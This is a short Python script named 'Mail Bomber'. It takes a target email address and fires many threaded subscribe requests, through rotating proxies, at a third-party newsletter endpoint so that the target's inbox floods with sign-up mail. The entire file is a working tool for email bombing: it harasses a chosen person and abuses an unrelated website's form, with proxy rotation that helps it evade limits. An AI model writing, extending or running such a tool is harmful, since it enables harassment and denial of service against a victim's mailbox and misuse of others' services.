import os
import json
import httpx
import string
import random
import logging
import itertools

from concurrent.futures import ThreadPoolExecutor

__config__, __proxy__ = json.load(open("config.json", "r", encoding="utf-8")), itertools.cycle([proxy.rstrip() for proxy in (open("data/proxies.txt", "r"))])

logging.basicConfig(
    level=logging.INFO,
    format="\x1b[0m(\x1b[38;5;41m%(asctime)s\x1b[0m) %(message)s",
    datefmt="%H:%M:%S"
)

class Bomber:
    def __init__(self):
        self.success: int = 0
        self.failed: int = 0
        self.proxy: None = "http://" + next(__proxy__) if __config__['proxy'] == True else None
        self.session: httpx.Client = httpx.Client(proxies=self.proxy)
        
    
    def mail_bomber(self, mail) -> str:
        name = "".join(random.choice(string.ascii_lowercase) for _ in range(9))
        mail = mail.replace("@", "%40")
        try:
            os.system("title Mail Bomber ^| Success: {} ^| Failed: {} ^| Mail: {} ^| Amount: {}".format(self.success, self.failed, mail, __config__['amount']))
            response = self.session.get("https://emosurff.com/?email={}&name={}&jaction=subscribe%3Aemail&transactionId=1&tstamp=0".format(mail, name))
            if response.status_code in (200, 201, 202, 204):
                self.success += 1
                logging.info("Mail sent with status code: {}".format(response.status_code))
                
            elif response.status_code in (400, 401, 404, 500, 501, 502, 503, 504):
                self.failed += 1
                logging.info("Mail failed with status code: {}".format(response.status_code))
                
        except Exception as error:
            self.failed += 1
            logging.info(error)
            
    
    def start(self) -> None:
        mail = str(input("Target mail: "))
        with ThreadPoolExecutor(max_workers=__config__['threads']) as ex:
            for x in range(__config__['amount']):
                ex.submit(self.mail_bomber, mail)
                

if __name__ == "__main__":
    Bomber().start()